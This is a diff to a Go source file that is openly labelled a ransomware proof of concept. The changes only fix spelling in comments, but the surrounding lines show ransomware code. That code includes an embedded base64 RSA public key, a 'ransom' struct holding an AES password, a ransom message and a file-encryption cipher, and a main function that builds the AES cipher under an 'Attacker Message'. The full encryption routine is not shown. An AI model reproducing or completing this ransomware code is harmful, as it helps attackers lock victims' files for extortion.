@@ -21,14 +21,14 @@ import (
 const KEY = "LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUNDZ0tDQWdFQTFsUnpnQnJQUlI0ZGtTc3ZJTklpNC9ON1I2YThtSTUzZUNlblkxL254K210d09sbS9JekkKbE9ST2pPd0IrbDlmZlVRMEhrRUVldkhqUUZJWHJCUnhzd2lLUGMwb2ZnSzVVbnl0NjRjTUFSZDJDRmN2enh1VgphcWZvN2dBZGVObEtZcVdBZ2JSZHZjYlFwa0xnajhUTGpwaVIxQkUzMkVsL1dXRGFpNW4wQ3VIa2NGdzUwS3p5CkYrTGtoeVVPYVM3U0Z6M2theUZuSTRQSkdEdlNGQ1VKZ0M0UEFvNlF1Mjk5UlgyS0VBdGVOSXozOEJkV2ZaaXEKOGxYOXMyM1dwaVFBUXpOeC84Z1RMOWlIU2JXaUhHL2FhbWdUZE1qSjMrc0hhQ2Z0NWl5SS9zc1JRcmpCYVQ3RApXQ1hrSEsrNEliUG9EYkVZWTJDWDB5TXoyUzBTTjVrS1UyL3FyZ1VMTlJEYjZpc1NvQnhWTlN6RGdYK0cwWXd5Ck9WaTdINEMxL3cxSm8zbFQ5UmRwd0I3SHBvWkZyNUhzdVJvZ3QraVdIajh0UjNDNElXTzdkR0pJVUNHRHZpOHkKZXk4eklGQjN3YVdIR2hMekNYMjl6M09rOUp6RHQ1MTJOV0w2dkNoVllNdm9xNU50ZkRoSVJQUUpscmN2bDcwaApXNUExOGd2cUpYMzEzdVhrUWZNb0MwTklCZUZLRk9POForNkJPZGdvbEdyYWxPR3AzYU9aVXhiUU05TUg1dU1JCmlsNlk1MjVlTUh1dFFkenQ5ck9CVnpJZk90MlNrb1RFeUhJSEJKWWU3bDgzOU5kaHZHTEcydW1OS0dQbWdIVXMKakdGMHFjU0IwS29ONTQ3b1plNDIvaW0wM1RSVjFTOHpSN0hDNzZMOTVXSDhnRHlKaHVoWVliMENBd0VBQVE9PQotLS0tLUVORCBSU0EgUFVCTElDIEtFWS0tLS0t"
 
 type ransom struct {
-	password string        // aes-encryption-chiper
+	password string        // aes-encryption-cipher
 	message  string        // clear-text-message
 	public   rsa.PublicKey // base64-decoded-KEY
 	aes      cipher.Block  // file-encryption
 }
 
 // decode public key, generate and export
-// encrypted AES chipers, together clear-text message
+// encrypted AES password, together clear-text message
 func start(msg string) *ransom {
 	public_key := parse_key(KEY)
 
@@ -144,7 +144,7 @@ func main() {
 	// generate and export encrypted AES passwords
 	r := start("Attacker Message: 'Ransomware Proof Of Concept'")
 
-	// make AES chiper
+	// make AES cipher
 	aesc := []byte(decode(r.password))
 	aesEn, aesErr := aes.NewCipher(aesc)
 	handleError(aesErr)
